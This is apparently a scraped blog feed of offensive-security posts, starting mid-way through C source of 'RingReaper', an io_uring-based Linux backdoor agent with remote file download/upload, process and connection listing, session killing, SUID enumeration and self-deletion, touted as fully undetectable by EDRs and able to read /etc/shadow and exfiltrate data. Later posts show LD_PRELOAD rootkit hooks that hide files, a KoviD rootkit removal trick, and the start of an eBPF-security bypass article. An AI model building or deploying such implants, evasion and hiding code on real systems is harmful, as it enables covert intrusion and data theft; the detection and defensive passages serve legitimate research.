\u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing 